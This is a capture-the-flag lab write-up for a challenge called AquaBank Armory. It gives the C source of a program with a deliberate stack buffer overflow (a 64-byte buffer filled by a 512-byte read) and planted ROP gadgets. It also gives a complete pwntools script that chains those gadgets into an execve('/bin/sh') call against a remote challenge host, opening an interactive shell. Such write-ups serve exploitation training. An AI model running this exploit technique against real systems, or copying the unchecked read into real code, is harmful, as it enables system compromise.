## AquaBank Armory - ROP with Buffer Overflow

We now transition our academic focus toward the subsequent laboratory exercise designated as AquaBank Armory, which features a minimalistic command line application developed in the C programming language, where the primary objective requires the sophisticated application of Return Oriented Programming to achieve arbitrary command execution. Upon a rigorous inspection of the provided source code, one will readily identify a critical vulnerability residing within the `vuln` function, given that the developer allocated a local character array of exactly sixty four bytes but subsequently invoked the `read` function to accept up to five hundred and twelve bytes of user input directly from standard input. This profound discrepancy in boundary enforcement establishes a textbook **Buffer Overflow** condition, which allows an attacker to easily overwrite the saved instruction pointer located on the execution stack, requiring a precise padding of seventy two bytes to seize control of the program flow.

Because modern systems frequently implement memory protections that prevent the direct execution of injected shellcode, the exploitation strategy must leverage the pre existing assembly instructions deliberately embedded within the binary, which are exposed as dedicated functions returning immediately after their execution. By meticulously linking these assembly gadgets, the exploit constructs a specialized payload that first orchestrates a system call to write the `/bin/sh` string directly into the uninitialized data segment known as the BSS section, utilizing the zero value in the accumulator register to define the read operation. Immediately following this arbitrary write primitive, the execution chain perfectly aligns the registers to invoke the system call for process execution, identifying the fifty ninth system call through the accumulator register while passing the newly populated memory address as the primary argument, which ultimately replaces the current process image with an interactive shell and successfully compromises the target architecture.



```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void setup(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

__attribute__((naked, used)) void pop_rdi_ret(void) { __asm__("pop %rdi; ret"); }
__attribute__((naked, used)) void pop_rsi_ret(void) { __asm__("pop %rsi; ret"); }
__attribute__((naked, used)) void pop_rdx_ret(void) { __asm__("pop %rdx; ret"); }
__attribute__((naked, used)) void syscall_ret(void) { __asm__("syscall; ret"); }

static void vuln(void) {
    char buf[64];

    puts("[armory] Storeroom open -- pick your weapons:");
    (void)read(STDIN_FILENO, buf, 512);
    puts("[armory] Locking down.");
}

int main(void) {
    setup();
    vuln();
    return 0;
}
```



```Python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./aquabank-armory', checksec=False)
context.binary = elf
context.arch = 'amd64'

OFFSET_TO_RIP = 72

pop_rdi = elf.sym.pop_rdi_ret
pop_rsi = elf.sym.pop_rsi_ret
pop_rdx = elf.sym.pop_rdx_ret
syscall = elf.sym.syscall_ret

rop = ROP(elf)
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
bss_addr = elf.bss()

HOST = "offsec.m0lecon.it"
PORT = 13503


def conn():
    if not args.LOCAL:
        return remote(HOST, PORT)
    return process(elf.path)


p = conn()

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(pop_rdi),
    p64(0),
    p64(pop_rsi),
    p64(bss_addr),
    p64(pop_rdx),
    p64(8),
    p64(pop_rax),
    p64(0),
    p64(syscall),
    p64(pop_rdi),
    p64(bss_addr),
    p64(pop_rsi),
    p64(0),
    p64(pop_rdx),
    p64(0),
    p64(pop_rax),
    p64(59),
    p64(syscall)
)

p.recvuntil(b"weapons:\n")
p.send(payload)
p.send(b"/bin/sh\x00")
p.interactive()
```

> **Return Oriented Programming (ROP):** This advanced exploitation technique involves the chaining of small sequences of existing machine instructions ending in a return statement, where an attacker carefully orchestrates the execution flow to bypass memory execution protections and perform arbitrary operations by relying entirely on code that is already present within the compromised application space.